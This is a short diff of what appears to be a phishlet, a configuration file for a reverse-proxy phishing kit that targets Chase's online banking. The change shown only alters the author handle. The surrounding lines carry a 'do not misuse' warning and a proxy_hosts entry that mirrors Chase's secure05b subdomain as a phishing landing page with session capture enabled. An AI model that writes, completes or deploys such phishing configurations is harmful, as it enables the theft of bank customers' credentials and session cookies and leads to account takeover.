@@ -2,7 +2,7 @@
 # PLEASE DO NOT MISUSE THIS PHISHLET.
 
 
-author: '@An0nud4y'
+author: '@rootbck'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'secure05b', orig_sub: 'secure05b', domain: 'chase.com', session: true, is_landing: true}
